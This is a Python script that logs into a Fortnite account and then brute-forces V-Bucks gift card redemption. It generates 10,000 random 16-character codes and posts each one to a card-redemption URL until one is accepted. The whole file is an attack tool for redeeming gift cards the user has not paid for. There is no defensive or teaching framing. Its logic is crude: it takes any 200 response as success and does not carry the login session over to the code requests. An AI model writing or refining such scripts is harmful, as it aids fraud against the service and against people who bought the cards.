import random
import string
import requests
import time
import logging

def generate_word_list():
    word_list = [''.join(random.choices(string.ascii_letters + string.digits, k=16)) for _ in range(10000)]
    return word_list

def save_word_list(word_list):
    with open("word_list.txt", "w") as file:
        file.write("\n".join(word_list))

def perform_login(email, password):
    login_url = "https://www.fortnite.com/login"
    user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
    headers = {"User-Agent": user_agent}
    
    try:
        response = requests.post(login_url, data={"email": email, "password": password}, headers=headers)
        response.raise_for_status()
    except requests.exceptions.RequestException as e:
        logging.error("Login failed: %s", e)
        return False
    
    if response.status_code == 200:
        return True
    else:
        return False

def enter_code(url, code):
    try:
        response = requests.post(url, data={"code": code})
        response.raise_for_status()
    except requests.exceptions.RequestException as e:
        logging.error("Code entering failed: %s", e)
        return False
    
    if response.status_code == 200:
        return True
    else:
        return False

if __name__ == "__main__":
    logging.basicConfig(filename="fortnite_log.txt", level=logging.ERROR)  # Configure logging
    
    word_list = generate_word_list()
    save_word_list(word_list)

    email = input("Enter your email: ")
    password = input("Enter your password: ")

    login_url = "https://www.fortnite.com/login"
    code_entering_url = "https://www.fortnite.com/vbuckscard"

    login_success = perform_login(email, password)

    if login_success:
        for code in word_list:
            success = enter_code(code_entering_url, code)
            
            if success:
                print("Successfully entered code:", code)
                break
            else:
                time.sleep(1)
        else:
            print("No valid code found.")
    else:
        print("Login failed. Please check your credentials.")
